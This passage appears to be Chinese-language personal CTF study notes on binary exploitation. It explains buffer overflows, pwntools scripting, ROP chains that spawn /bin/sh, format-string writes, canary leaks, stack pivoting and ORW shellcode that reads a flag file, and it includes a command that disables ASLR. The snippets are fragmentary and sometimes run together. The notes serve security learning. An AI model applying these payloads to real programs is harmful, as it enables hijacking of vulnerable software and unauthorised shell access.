pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。\n（2）ebp：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。\n在栈中ebp常常保存着的是上一个函数的返回值，用于在栈使用完后返回之前的函数，在栈顶\n其中的值是一个指针指向原来的函数的栈低。\n在ebp的更高一位地址有一个更为重要的域：return address![屏幕截图 2023-11-20 210719](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-20 210719.png)\n当一个域的函数执行完其中的代码开始执行return前，会先将栈中的esp移到与ebp相同的指向地址并指向这里\n之后由于ebp中存放的是上一个函数的返回值，ebp便通过这个地址指向上一个函数栈顶，同时存放再上一个函数的返回值，与此同时esp自动加一指向return address；\n在ebp和esp中有一个变量可以由我们向其中输入无限的变量，那我们便可通过输入的数据将ebp指向的上面的数据覆盖，然后在程序执行时，到返回地址时由于已经被我们写入的数据覆盖，会直接返回我们写入的地址，从而达到我们的目标，在ida中我们可以先找到那个变量，便可以看到他与ebp和esp的距离，如：char s;&#x2F;&#x2F; [esp+1ch] [ebp-64h]（可能会出现错误，如果有错用动态调试）,我们可以看到此时的s变量距离ebp是0x64字节，当我们向其中写入0x64个字节的数据便可以到ebp的位置，在向上写4个字节便可以覆盖ebp指向的位置，在写4个字节便是要返回的话数值，于是我们只要想s中写入0x68字节的垃圾数据和0x4个字节的特殊数据便可以在函数执行后不正常反悔而是返回到我们需要的值。\n通过sub   esp，空间大小           确定栈的空间大小；\nesp始终指向栈顶，ebp是在堆栈中寻址用的\n栈帧也叫过程活动记录，是编译器用来实现过程&#x2F;函数调用的一种数据结构。简言之，栈帧就是利用EBP（栈帧指针，请注意不是ESP）寄存器访问局部变量、参数、函数返回地址等\n栈溢出\n#include &lt;unistd.h&gt;#include &lt;unistd.h&gt;int main()&#123;char str[8];read(0,str,24);return 0;&#125;\n\n在上面那个程序中str在main函数中栈有8个字节的缓冲区，通过read函数输入值进入str中\n在机械执行的过程先将ebq入栈，用于固定返回位置，但是在输入值时由于超出str的区域，使得原本用于返回的值被覆盖，当程序执行到那时不在返回原本应该返回的值，从而出现错误。\n00\n传参：\n•x86\n•使用栈来传递参数\n•使用 eax 存放返回值\n•amd64\n•前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中\n•第7个以后的参数存放于栈中\nnc+网址 用于远程链接 \npwntools\n在python中 先输入\nfrom pwn import *\n\n导入环境，通过\nio = process(&quot;./文件名&quot;)\n\n与本地的程序建立一个链接，并获的pid：进程号（文件要是可执行文件）；通过\nio = remote(&quot;ip&quot;,端口)\n\n与远程端口链接。吧“\n在于端口连接后需要接送端口传来的数据可以通过\nio.recvline()\n\n接收传来的一行数据，但只能是一行，\n若要向端口传输数据，需注意由于是端口只能传输数据流，需进行特殊处理\n传整数，根据传输对象加上p32（）或者p64（），在字符串前加上b(“”)\nio.sendline(b&#x27;A&#x27;*12+p32(0x75834))//也可以换send但要在字符串后加\\nio.sendlineafter(&#x27;程序的输出&#x27;,payload)\n\n若端口在接收数据后会返回程序通过\nio.recv()\n\n一般在最后会加上\nio.interactive() 允许我们在终端里将命令传送到远程服务器. Pwntools 会自动接收输出并回显 .\n\n接收端口的返回\nio.recvuntil(b&quot;;&quot;)\n\n以为接收程序发的数据直到；这个符号为止\n写Python脚本\n#!/bin/python3from pwn import *    ...io.interactive()    \n\n写好之后用python +这个文件名\ncontext.log_level = &#x27;debug&#x27;gdb.attach(io,&#x27;b *地址&#x27;)pause()    \n\n用于在程序进行之中时，进入调试状态。\nprint(&quot;main_real_addr:&quot;,main_real_addr)\n\n\n\nljust() 方法将使用指定的字符（默认为空格）作为填充字符使字符串左对齐\n\n \n在pwntools中shellcraft.sh   shellcode      elf.search，ljust\n\n \n函数栈的工作方式，rope链的构造，动态链接的解析过程&#x3D;\n\n在pwntools中shellcraft.sh\n在文件中可以通过如下代码链接，从而对文件中的部分数据进行分析\nelf=ELF(&quot;./文件名&quot;)\n\n如果在文件中有puts函数，可以通过如下代码查看puts函数在got表像中的地址（）\nhex(elf.got[&quot;puts&quot;])/不加hex（）则打印出来的是十进制数字，hex将十进制转化为16进制next(elf.search(b&quot;/bin/sh&quot;))    \n\n\n\n动态调试\ngdb 文件名（必须是可执行的文件a.out）\n\n进入调试出现pwndbg&gt;标志吧\nb+断点，然后r开始调式\nstart，程序将停在main函数的第一行，或程序的入口第一条指令。\nbacktrace显示·整个函数的函数调用栈的状况，由上到下调用，下调用上。\nreturn直接回到main函数\n1 #!/bin/sh2 3 gcc -fno-stack-protector -z exestack -no-pie -g -o wwww wwww.c \n\ngcc -fno-stack-protector关闭canary\ncanary保护\n当栈被创立的时候会在ebp的下面放上一个随机值，在程序执行到返回时先检查那个随机值是否正确。不正会直接停止运算\n-z exestack打开栈的可执行权限\n-no-pie,关闭pie\npie 将elf文件的本体和载入地址都随机化（text，data，bss区的地址）\n-g可以在调式时代上源代码，但要在最后加上源代码文件\n-o输出文件的名字\n在保存后用chmod +x 文件名，为文件赋权\necho 0 &gt; /proc/sys/kernel/randomize_va_space\n\n修改发送的栈的地址是不是随机值，正常情况下&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space的值为2，若要此时的栈地址则会得到的是一个随机值，修改为0后将称为一个定值，可以通过cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space知道其值为多少，\n![屏幕截图 2023-11-21 211454](博客&#x2F;屏幕截图 2023-11-21 211454-17115441695152-17115441721904-17115441747796.png)\n通过动态调试，可以知道我们输入的AAA在一开始入栈的地址为0x7fffffffdeb0,而ebp指向的为0x7fffffffdf20，距离是160个字节，故我们要填充的是160+8（x64系统为8个）垃圾数据然后的8个为需要执行的数据，\n在攻击前由于程序是x64需通过一下指令在pwntools中修改\ncontext.arch =&quot;amd64&quot;\n\nldd 文件名（必须为可执行的文件名），查看该文件用到的所有动态链接库，如图\n![屏幕截图 2023-11-21 220537](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-21 220537.png)\n其中要重点关注的是第二行，libc.so.6是软链接相当于快捷方式的值指向的是lib中的存放C语言的动态链接库\n动态链接库本身就是一个可执行文件，他也有可执行的入口 \nROPgadget --binary yichu --only &quot;pop|ret&quot;，？\n\n在yichu这个可执行文件中寻找为pop，ret的汇编代码\n在文件名搜system，\nint 0x80,中断号代表进行系统调用，调用系统函数时，函数名一般为sys_write（），但是我们不能直接用他的名称只能在调用时用代号，如sys_write()代号为4，sys_execve()代号11,0xb，可以用0xb直接调用sys_execve()\n在使用int 0x80，要确保（eax&#x3D;0xb,ebx&#x3D;0x8048xxxx,ecx&#x3D;0,edx&#x3D;0）这4个寄存器都已经完成初始化，eax中的0xb代表的是系统函数的调用代（0xb-&gt;sys_execve()）,ebx中存放的是我们最后要执行到的最后地址，如、bin&#x2F;sh&#x2F;的地址\n![屏幕截图 2024-01-07 155233](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2024-01-07 155233.png)\npayload&#x3D;b’A’*112(垃圾数据)+p64(pop_eax_ret)+p64(0xb)+p64(pop_edx_ecx_ebx_ret)+p64(0)+p64(0)+p64(bin_sh)+p64(int_80h)[其中的pop_eax_ret，pop_edx_ecx_ebx_ret，bin_sh，int_80h都要在程序中找到地址并在程序之前写明]\n![屏幕截图 2023-11-22 213524](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-22 213524.png)\n![屏幕截图 2023-11-23 150419](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-23 150419.png)\n在linux中可以生成的可执行文件分为动态链接文件和静态链接文件，用gcc默认生成的是动态链接，用file分析会出现dynamically linke的标志，其中不含有C语言的基本执行代码只有经过编译后的源码，在执行时与系统链接使用C语言的基本代码。\ngcc --static 文件名\n\n 当执行以上代码时会生成静态链接的文件，用file分析是会有statically linke的标志，其中包含有C              语言的基本执行代码。 \n![屏幕截图 2023-11-23 152644](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-23 152644.png)\n![屏幕截图 2023-11-23 153131](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-23 153131.png)\n.got 保存了整个程序的虚拟内存空间中各个符号（变量）的偏移量（地址）\n.got.plt保存的是函数的地址\n●.dynamic section\n○提供动态链接相关信息，为操作系统描述整个动态链接的所用内容包括其他的表的位置等等\n●link_map○保存进程载入的动态链接库的链表\n●__dl_runtime_resolve\n○装载器中用于解析动态链接库中函数的实际址的函数\n动态链接的过程![屏幕截图 2023-11-23 164625](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-23 164625.png)\n1，第一次进行链接\n在程序中先定义一个foo函数\n代码段首次调用foo，跳转到 .plt 中的 foo 函数项，.plt 中的代码会使程序立即跳转到 .got.plt 中记录的地址\n由于进程是第一次调用 foo，故 .got.plt 中记录的地址是 foo@plt+1，于是会跳转到plt中的下一段代码，先将index入栈，index包括的是foo这个函数的在我们程序的位置（第几个函数），然后是跳转到PLT0段\n在PLT0中再将一个数入栈，这个数指的是用到的是哪一个动态链接库，之后进行跳转，到_dl_runtime_resolve函数，这个函数将解析 foo 的真正地址填入 .got.plt 中\n此后 .got.plt 中保存的是 foo 的真实地址\n![屏幕截图 2023-11-23 165300](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-11-23 165300.png)\n之后的调用到.got.plt处时便可以直接拿到foo的真实地址\n栈对齐，ret的加入，call的入栈使其对齐\nida基操\nida中shift+F12查找字符串 \ng可直接跳转到某个地址\nn 可以替换字符名称\nh 可以将数字从10进制转为16进制\ncontext.arch&#x3D;”amd64”\nprint(asm(shellcraft.amd64.sh()))（\nmov eax rax, 0xb 0x3bmov ebx rdi, [“/bin/sh”] mov ecx rsi, 0mov edx rdx, 0int 0x80 syscall=&gt; execve(&quot;/bin/sh&quot;,NULL,NULL)\n\n在静态链接中，在系统内核中的execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)这个函数可以获得控制权，但由于他是内核函数，所以，在调用它时必须满足一些必要的调用约定才可以进行调用，\n像这些系统内核函数调用必须使用一些特殊的汇编指令才能调用，如int 80（32位）和syscall（64位）就像一个call函数，但是是跳转到内核系统中，至于要跳到哪个函数则要根据之前部分寄存器的值来确定，eax(32)和rax(64)保存了系统调用号（内核函数在内核中都有独属于自己一个调用号，如execve的调用号为11（32位&#x3D;0xb）,59（64位&#x3D;0x3b））,ebx和rdi用来保存在函数中执行的参数的地址，同时要保证ecx，edx和rsi，rdx中的值都为0。\n![屏幕截图 2023-12-03 112959](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-12-03 112959.png)\n对于在动态链接中调用一个在plt段上的函数，先在ida中的plt段中找到需要调用的函数的地址，在栈溢出之后直接来到plt段的函数进行调用，需要注意的是在调用plt段中函数时由于函数会先创造一个独属于自己的栈，虽然这个栈不用关注，但由于这个栈的存在，在payload中plt函数不会直接读取下一个地址而是读取下下个地址，如get@plt会用的的是buf2的地址不会用中间的那一个。\n如果我们在使用时，需要平衡栈空间，便需要消除栈中的数据，对于get下的一个数据get会在最后进行消除，但buf2段不会被消除，此时便需要一个pop|ret的值在中间加入进去，对buf2的值进行消除，对于pop|ret的选择，最后选择通用寄存器入ebx等对程序不会起到大作用的寄存器加进去。\n以上的方法主要适用于在32位中的程序中，如果在64位的程序中，由于函数不会直接调用栈中的参数，在64位的系统中参数的前6个会分别存放在rdi、rsi、rdx、rcx、r8、r9 寄存器中，之后的才会放在栈中，同样的函数调用也是相同的，于是只要在函数执行前将函数调用的参数放在那6个寄存器中（一般函数调用一个参数时，更多的是将rdi的值修改为所需参数在的地址。相同的像gets这种输入的函数，先将rdi的值改为bss段中的空地址，于是输入的值便会直接将存放在那个bss段中，在后期调用时，将rdi中的值改为那个地址，然后直接将程序跳plt段中的函数地址，便会直接调用rdi中的地址的参数，执行函数。）\n![屏幕截图 2023-12-03 152037](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-12-03 152037.png)\n![屏幕截图 2023-12-03 151541](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-12-03 151541.png)![屏幕截图 2023-12-03 151922](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2023-12-03 151922.png)\n偏移地址的计算用的版本为libc6_2.35-0ubuntu3.4_i386（32位程序）的\n偏移地址的计算用的版本为libc6_2.35-0ubuntu3.4&#x2F;3.5_amd64（64位程序）的\n在pwntools中，p.recvuntil(“\\n”)指的是接收数据，直到遇到换行符”\\n”为止。这个指令用于从程序的输出中提取特定的数据。\nlibcaddr&#x3D;u64(p.recv(6).ljust(8,”\\x00”))指的是从程序的输出中接收6个字节的数据，然后用空字节”\\x00”填充到8个字节，并将其解释为一个64位的无符号整数（unsigned long long）。\n而libcaddr&#x3D;u32(io.recv(4))指的是从程序的输出中接收4个字节的数据，并将其解释为一个32位的无符号整数（unsigned int）。\n如何获取函数在libc中的偏移量呢？这里可能有两种情况，一种是libc已知，一种是libc未知。\nlibc已知\nlibc已知的情况，可以通过反编译libc获取地址。如下所示，利用radare分析libc文件，可以获取libc中write的偏移地址是0x000d43c0\n[0x000187c0]&gt; afl | grep write0x00063880   22 406  -&gt; 395  sym._IO_wdo_write0x000d43c0    5 101          sym.__write123\n\n也可以通过pwntools的ELF类，加载libc文件来获取目标函数的偏移地址。\nlibc= ELF(&#x27;./libc_32.so.6&#x27;)libc_write_offset = libc.sym[&#x27;write&#x27;]\n\n\n\n在64位的系统中在执行部分函数时其汇编代码中有,当程序在执行时发现停在这条指令而无法继续执行下去时说明程序在该函数的栈存在栈没有对齐的情况，解决的方法便是在payload的该函数的执行之前加上一个ret的命令。\nmovaps xmmword ptr [rsp + 0x40], xmm0这条指令会检查栈是否对齐\n\n\n\n再说b’a’*56的作用，他的作用就是为了平衡堆栈，也就是说，当mov_addr执行完之后，按照流程仍然执行400616处的函数，我们不希望它执行到此，因为会再次pop寄存器更换我们布置好的内容，所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域,可以被填充)，用垃圾数据填充地址0x16-0x22的内容，最后将main_addr覆盖ret，从而执行main_addr处的内容\n在C语言中对于一段字符串的存放与取用\n存放：在地址空间中将字符串转化位用x00截断的一串连续的字节序列（\\ad\\ds\\ew\\vd\\x00）\n取用：为了节省空间在取用这一段数据时不会直接将整个数据直接传入到函数中，只会把那个数据存放的地址作为指针，把指针作为参数传入到函数中，在调用函数时函数再到指针所指的地址中将那段数据，读出来使用。\n在使用printf打印字符时，当传进的数用的是\n%p时直接打印的栈上存放的数据，无论是真实的数据还是地址数据都直接打印出来，不做任何的操作\n%s时则会先把栈中的数据作为地址将其解析，然后将其作为地址对应的数据打印出来\n%n的作用是将栈中的数据作为地址将其解析，然后向那个数据的地址写入数据，而写入的数据是格式化字符串前方已经打印成功的字符的个数（如在%n执行之前成功打印出AAAAA的数据，则会在%n所在的数据代表的地址执行的地方改写成5），\n%11$n是一个格式化字符串中的特殊标记，它表示将当前打印字符的数量存储在第11个参数所指向的位置中。这个特性通常被用于进行格式化字符串漏洞攻击，要写第几个参数的位置就在%n中加上几$\n%c表示输出一个字符，如\nchar c=&#x27;a&#x27;;printf(&quot;%c,&quot;c)\n\n则会打印a这个字符，如果在后面有%n则算作1，如果%n要多个则可以将要的字节长度加在%和n的中间，如\nprintf(&quot;%20n&quot;,c)\n\n执行这个指令会打印的是长度为20的数据，且最后是a，在之前用空格补充不足20字节的地方，而如果后面有%n这会直接输入的数为20\n在用printf函数时,在打印数据的符号中间加上（’数字$‘）意为打印第几个参数的\nprintf(&quot;%3$d&quot;,a,b,c)\n\n如这个，意为直接打印第三个参数，c的值\n对于在程序输出中的数据中有我们需要的地址，但不是直接输出，可以用如下接收、\nio.recvuntil(&#x27;0x&#x27;)cancry =int(io.recv(16/8),16)//如果是64位程序为16,32位为8//16和8的区别在于程序最终需要的数据是几位的（16进制），如要的是0x0x5619d9400ccd，这为io.recv（12）        libc_start_main = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))    libc_start_main=u64(io.recv(12))    libc_start_main = u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))    libc_start_main=int(io.recvline().strip().split(b&#x27; &#x27;)[-1])\n\n\n\n\n\n所以我们需要把system的地址分成高八位和低八位 \nhigh_sys = (system_addr &gt;&gt; 16) &amp; 0xfffflow_sys = system_addr &amp; 0xffff\n\n这里的右移16位就是向右移动4个字节，获得到high_sys的高4位地址\n这个错误是由于在将整数转换为字节串时，需要使用encode()函数。你可以使用以下代码来解决这个问题：\npayload = b&#x27;%&#x27; + str((stack-0xc) &amp; 0xff).encode() + b&#x27;c%6&amp;hhn&#x27;\n\n\n\n在有些题中会遇到如下代码\nv0 = time(0LL);  srand(v0);  v4 = rand();\n\n解释一下，这里将当前的时间作为一个种子复制给v0（*v0 &#x3D; time(0LL)*），将v0这个种子植入到srand函数中，之后rand函数会根据srand中的数值生成一个随机数，由于之前的种子是有当时时间决定的，故理论上每次运行中的rand中的值由于v0的不同而生成的随机数也不同。如果不将srand中的值用v0作为一个时间变量的话rand中生成的随机数是固定的一个数。\n如果在程序中不能直接暴露那个随机数可通过以下代码直接将那个数在脚本中同样生成，（同时运行时间相同，srand生成相同的随机数）\nfrom ctypes import *libc = cdll.LoadLibrary(&#x27;libc.so.6&#x27;) #调用标准库srand = libc.srand(libc.time(None)) #libc.time(None) 获取当前时间，然后将这个时间值传递给 libc.srand 函数来设置随机数生成器的种子saved_cookie = libc.rand() #生成随机数io.sendline(str(saved_cookie))#数字传入程序中需要str    \n\nlibc.so.6是调用本地的库，在打远程时需根据远程的环境改变，\n这一段代码要放在接近程序中生成随机数的地方，最好脚本的开始。\nfgets函数\nchar *fgets(char *buf, int bufsize, FILE *stream);\n\n其中的int bufsize指的是能输入的字节的大小，将int bufsize看作n，fgets函数只能读取 n-1 个字符（包括换行符）。如果有一行超过 n-1 个字符，那么 fgets 函数将返回一个不完整的行（只读取该行的前 n-1 个字符）\n也就是说，每次调用时，fgets 函数都会把缓冲区的最后一个字符设为 null(‘\\0’)，这意味着最后一个字符不能用来存放需要的数据。所以如果某一行含有 size 个字符（包括换行符），要想把这行读入缓冲区，要把参数 n 设为 size+1，即多留一个位置存储 null(‘\\0’)。\n在payload的构造中如果要使用到base64编码一个数据，在传入到中可以用以下代码\nimport base64//导入库，在脚本的一开始处就要payload=&#x27;A&#x27;*22//在使用base64这个库时因为后面的代码有地方改变，不能加bpayload64= base64.b64encode(payload.encode(&#x27;utf-8&#x27;))//将payload中的值转化为base64编码的赋值给paylaod64//此时直接输出payload64中的值会自动加入b，可直接使用\n\nimport base64payload=b&#x27;A&#x27;*32+p32(printf)payload64= base64.b64encode(payload)\n\n\n\n在使用栈覆盖将canary暴露出来是，先在调试阶段找到canary的地方，确定输入多少才能到canary的地方，如输入地方在0x11处，在调试中的canary指到的地方位0x22，距离为17个数，这可以构建的payload为b‘A’*17+b’B’，B的作用在与覆盖00，根据canary的值确定收的值\npayload=&quot;A&quot;*(17)+&#x27;B&#x27;io.recvuntil(&quot;B&quot;)canary=u32(b&quot;\\x00&quot;+io.recv(3))\n\n\n\n沙箱查询，用一下命令查找程序是否启动了沙箱\nseccomp-tools dump ./文件名\n\n\n如果出现了以上情况则说明该程序中的禁用了 execve, 由于system函数实际上也是借由 execve实现的, 因此通过 get shell的方法来解决本题比较困难 ，要用到ORW方法\n如果程序没用使用沙箱则会出现程序正常的执行效果。\n对于直接可以获得getshell的题，并且题目中没有后门函数，直接获得getshll的方法有3种\n1.用got表中的system和&#x2F;bin&#x2F;sh的地址直接获得getshell\n2.使用one_gadget直接获得shell\n3.修改寄存器的值并执行命令\n对于以上3种办法，第一种不多说，直接整就行，重点在第2，3种\n二，ong_gadget其实是在库中的一段指令，而这段指令只要执行就可以直接获得shell，但这种指令对寄存器有一定的要求，所以不并不是都可以，并且有的版本过高使得不能一次直接执行成功，我们一般也不会只得到一个，最好一个一个试看看能获得shell，\n对于程序中的one_gadget的寻找可以通过一个工具直接找，需要执行以下的名令\none_gadget /usr/lib/x86_64-linux-gnu/libc.so.6(/usr/lib/i386-linux-gnu/libc.so.6)\n\n后面接入的是动态链接库，对于32位和64位是不同的库，可以直接在gdb在找，如要打远程则用远程的库，\n![屏幕截图 2024-01-07 150423](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2024-01-07 150423.png)\n一般执行后的情况如下\n![屏幕截图 2024-01-07 150608](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2024-01-07 150608.png)\n要用到的是execve前面的数，这个数字代表这的是在程序中的one_gadget相对于程序基值的偏移量，在使用的过程中用这个数加上程序的基值，便是one_getgad的地址，将程序在执行过程中挟持到这个地方便可以执行one_getgad.但是很多时候并不能成功要每一个都试一下\n三，对于第3种修盖寄存器的指令，就是如下的办法，但很多时候程序中有的指令时不够用的，以此便要提到使用库中的方法\n![屏幕截图 2024-01-07 155233](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2024-01-07 155233.png)\n在所有的动态链接库中都有很多的指令，不过动态链接库中的地址都是相对偏移量，要加上程序的基值才是真实地址，并且有的并不能把直接用，要多试\n![屏幕截图 2024-01-07 154649](C:\\Users\\x\\Pictures\\Screenshots\\Screenshots\\屏幕截图 2024-01-07 154649.png)\n如图，可以使用ROP的方法在链接库中寻找需要的偏移量，相同的对于在函数中要用的syscall和0x80指令都可以在动态链接库中找到，然后直接用就行，\n对于64位的程序补充一种指令的使用，\nrdi--&gt;binshrsi--&gt;0r15--&gt;0rdx--&gt;0system    \n\n对于64位的程序如果直接用system(&#x2F;bin&#x2F;sh)可能会出现问题，便可以用以上的方法获得shell\n栈迁移\n对与在栈溢出的情况中如果，输入的地方有限制使得能溢出的大小比较小，不够直接直接执行getgad便需要将栈进行迁移，对于迁移的地方有两个，一种是将程序在此迁移到栈执行的地方将程序在栈上在执行一次，将我们的getgad输入到栈上，执行之后获得shell，但这种的限制比较高，最好不要将程序只要，最好将程序通过溢出使其栈迁移到bss段中的空白处，然后向那段程序中写入getgad并执行\n无论是32位还是64位的程序，基础的栈迁移都是一样的，先将要溢出的0-地方的写满，刚好写到变量的最大值（看程序中的变量到ebp的距离），先全部覆盖完之后，在写入要将栈迁移的地址，最后写leave的地址（在程序中找，一般可以直接找到）\npaylaod=b&#x27;A&#x27;*(到ebp的量)+p32(新地址)/p64()+p32/64(leave)\n\n这样之后栈的ebp便会改变为新的地址，然后程序便会执行新地址4位（32位的程序）&#x2F;8位数（64位的程序）后面的地址中的指令，而新地址的前面4或8位数将成为程序执行这一部分时的ebp中的值，因此，在bss段中栈的新迁移地址的前4&#x2F;8位数要么是垃圾数据，要么是再下次栈迁移的新地址。\n如果在程序中有canary保护时，栈迁移则需要先将canary绕过在将数据覆盖到ebp的位置，然后再迁移\npayload=b&#x27;A&#x27;*程序崩溃前最大值+p32/64(canary)//如果有问题将p32/p64去除，直接使用canarypayload=payload.ljust(到ebp的量,b&#x27;\\00&#x27;)payload+=p32/64(新地址)+p32/64(leave)\n\n\n\n在很多可以输入的地方，特别要注意是否对输入的数据的长度有没有检查，对于有检查的要重点注意输入的数据是否超出可以输入的长度，特别在栈迁移中，对于是否要加上line，既在输入的数据的末位加上\\n(很多时候这个换行符会被当成一个字节)要多加小心，有时会因为这个字节使输入时出现问题\n同时line的使用也是必不可少的，有时候不加这个最后的换行符，会使数据传不过去，要随时注意\n在有的栈迁移中垃圾数据的长度不一定是到rdp长度加上8&#x2F;4，有可能只是到rbp的长度不用加上后面的数据便可以直接进行栈迁移\n再用动态链接库调用函数的偏移地址的方法\nelf=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)puts=elf.symbols[&#x27;puts&#x27;]    sys=elf.symbols[&#x27;system&#x27;]bs = next(elf.search(bytes(&#x27;/bin/sh&#x27;, &#x27;utf-8&#x27;)))        elf=ELF(&quot;./文件名&quot;)puts_got=elf.got[&quot;puts&quot;]puts_plt=elf.plt[&quot;puts&quot;]\n\n本地的库可以在gdb调式中找到，远程的库直接链接就行\n在一些程序中特别是静态的程序，他会将如main函数等主要的函数换一个看不出来特别的函数名，此时若要找到其主要函数的位置则可以通过在汇编中的start函数中的位置找到\n\nORW\n关于有沙箱的题的禁用了system等直接获得shell的题目，通过mprotect函数和shellcode直接将flag打印在屏幕上，\n在遇到这类题如果有canary保护，必须要通过之前的方法将canary绕过，这里将直接写payload的过程\npayload=p64(pop_rdi_ret) + p64(bss_addr + 0x500) + p64(gets)    #构造mprotect，更改内存保护属性payload+=p64(pop_rdx_pop_r12_ret)+p64(7)+p64(0)#设置保护属性    //这里只用将rdx改为7便可以，如果没有单独的rdx在加上其他寄存器payload += p64(pop_rsi_pop_r15_ret) + p64(0x1500) + p64(0)#设置大小payload += p64(pop_rdi_ret)     + p64((bss_addr&gt;&gt;12)&lt;&lt;12)#设置起始地址payload += p64(mprotect)#调用mprotect#修改内存保护属性后，令RIP指向下方构造的shellcodepayload += p64(bss_addr + 0x500)\n\n对于上文中的pop ret指令如果能在程序中直接找的则最好，如果找不到则通过libc库中的指令运行，对于bss_addr + 0x500只要是bss段中的空地方都可以，mprotect的地址也需要在libc库中寻找，\nmprotect=libc.symbols[&#x27;mprotect&#x27;]+libc\n\n将这段payload注入到程序中，之后便可以直接注入shellcode，关于shellcode可以直接使用库中能直接使用的\ncontext.arch =&quot;amd64&quot;payload  = shellcraft.open(&quot;flag&quot;)#将远程flag文件内容写入缓冲区，open成功时返回值为3#                          fd  address          sizepayload += shellcraft.read( 3, bss_addr+0x100, 0x30)payload += shellcraft.write(1, bss_addr+0x100, 0x30)io.sendline(asm(payload))//初始化后直接注入程序中\n\n在shellcode的构造中fd的值为固定值\naddress为程序中的空地址\nsize为读取的数据长度\n这里讲关于ORW的另外一种使用payload构建指令集，然后调用三个不同的函数open，read，write（在有的题中的没有这个函数对与其他只要是能将东西打印在屏幕上的就行，如puts函数），\n1，调用open函数打开flag文件\n在程序的任意一个可读可写的区域如，bss段注入b’.&#x2F;flag\\x00\\x00’(满足8字节方便栈对其)\n将存放b’.&#x2F;flag\\x00\\x00’的地址注入到寄存器rdi中，（作为open函数打开的文件名）\n再将rsi和rbp中的值分别改为0和1，有时可能还需要将rdx中的值改为0\n\nrdi：要打开的文件名的地址（”flag”的地址）\nrsi：打开文件的模式标志（通常是O_RDONLY，即0）\nrdx：额外的标志或权限（通常可以设置为0）\n\n在完成上面的一切后可以执行read函数\npayload=b&#x27;./flag\\x00\\x00&#x27;payload+=p64(pop_rdi_ret)+p64(buf)//为./flag\\x00\\x00的存放地址payload+=p64(pop_rsi_pop_r15_ret)+p64(0)+p64(0)//在很多程序中不能找到之改变rsi的命令payload+=p64(pop_rbp_ret)+p64(1)+p64(open_plt)\n\n在执行完上面的程序后如果能成功打开文件，对于程序来说回通过rax寄存器返回一个值，对于这个值如果为非负数（一般为4），这表示成功打开这个文件，如果是负数如0xffff则没有打开成功，这个数是文件描述符 fd，将在后边调用read函数作为其中一个参数传入\n2，调用read将flag文件中内容读到程序中\n在调用read函数之前要将这三个寄存器改为相应的值\n\nrdi：设置为文件描述符，即指向已经打开的文件的文件描述符。便是在调用open函数最后通过rax寄存器返回的值（一般为4）\nrsi：设置为读取数据的缓冲区的地址。找一个可读可写的空地址bss段\nrdx：设置为要读取的字节数。\nrbp：设置为1\n\n但是一般在程序中基本不能找到刚好改变这三的寄存器的命令\n特别是在动态链接中最多能找到的是改变rdi和rsi的命令，在这里将之前的一种方法再次讲一遍利用__libc_csu_init函数中的两段命令，将一些没有直接修改寄存器的值改变，\n\n一般在这个函数的最后这里都会有这两段命令，1，从0x400A3A到0x400A44的修改5个寄存器的值命令。2，从0x400A20到0x400A29的将r13,r14,r15d分别复制到rdx,rsi,edi(这里edi是rdi寄存器的后8位，一般来说对于rdi寄存器来说不会用到前8位，这样一般就可以了)，然后跳转到r12+rbx*8的地址。通过以上两段命令变刚好可将我们需要的三个寄存器的值改变，\npayload=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)//为了后面跳转不被影响payload+=p64(1)+p64(read_got)//修改rbp的值，r12为之后要跳转的函数，必须使用got表的地址不能用plt的paylaod+=p64(0x要读取的长度)+p64(buf空的可写可读之地)+p64(4rax的返回值)payload+p64(csu_init)+b&#x27;A&#x27;*0x38//为了将使用这段指令所空出来的值补完便于执行后面需要的命令\n\n\n\n如此在将这几个寄存器的值修改后便会执行got表的地址运行read函数将文件中的内容读到程序中的设定地\n3，调用puts函数将内容打印出\n将之前read函数读取的内容存放之地址放在rdi寄存器中执行plt表的puts函数地址就行\npayload+=p64(pop_rdi_ret)+p64(buf)+p64(puts_plt)\n\n\n\n\n\n至此便是通过orw的两方法将flag文件中的内容答应在屏幕上\n栈溢出的本意便是通过栈溢出将程序的执行劫持，通过栈溢出将本该执行的栈上的程序通过栈溢出覆盖成自己要想执行命令，如果有的栈所限制的数据太少以至于，连栈迁移的长度都不够，便可以考虑通过栈溢出后将后面要执行的，命令的地址的后面改成其他有用的函数地址，特别是在有pie保护的题中所有的程序只有最后4为数值不同，便可以再栈溢出后加上要挑战的函数的地址的最后的不同的几位，在栈溢出后便会直接跳转到需要执行的函数，\npayload=b&#x27;A&#x27;*0x28+b&#x27;\\x69&#x27;\n\n\n\n对于整数溢出来说，有一种向下溢出，在程序中如果有整数溢出的存在，但一个数被减成负数时在程序中并不会显示成负值反而会成为一个在允许范围内最大的数，0